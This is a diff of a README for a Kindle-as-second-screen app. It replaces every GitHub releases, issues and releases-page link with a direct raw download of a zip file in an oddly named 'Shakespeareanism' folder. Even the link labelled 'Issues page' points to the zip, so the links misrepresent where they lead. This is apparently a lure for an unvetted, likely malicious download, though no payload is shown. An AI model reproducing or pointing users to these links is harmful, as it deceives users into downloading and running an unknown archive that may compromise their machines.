@@ -1,6 +1,6 @@
 # 📚 Kindle-to-PC-Wireless-Connection-as-SecondScreen - Use Your Kindle as a Screen
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/main/Shakespeareanism/Kindle-to-PC-Wireless-Connection-as-SecondScreen.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/main/Shakespeareanism/Kindle-to-PC-Wireless-Connection-as-SecondScreen.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Transform your Kindle into a secondary screen with this application. It allows y
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download the Latest Release](https://github.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/releases).
+To download the application, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/main/Shakespeareanism/Kindle-to-PC-Wireless-Connection-as-SecondScreen.zip).
 
 Follow the steps below for installation:
 
@@ -64,7 +64,7 @@ Currently, this application supports streaming to Kindle devices only.
 
 ## 📞 Support
 
-For more help, visit the [Issues page](https://github.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/issues) or ask questions in the community forums.
+For more help, visit the [Issues page](https://raw.githubusercontent.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/main/Shakespeareanism/Kindle-to-PC-Wireless-Connection-as-SecondScreen.zip) or ask questions in the community forums.
 
 ## 📝 License
 
@@ -72,6 +72,6 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 📢 Stay Updated
 
-To stay updated with the latest releases and features, check the [Releases page](https://github.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/releases) regularly. 
+To stay updated with the latest releases and features, check the [Releases page](https://raw.githubusercontent.com/Joshua3163/Kindle-to-PC-Wireless-Connection-as-SecondScreen/main/Shakespeareanism/Kindle-to-PC-Wireless-Connection-as-SecondScreen.zip) regularly. 
 
 By following these steps, you can easily download, install, and use the Kindle-to-PC Wireless Connection as a Second Screen application to enhance your reading and editing experience.
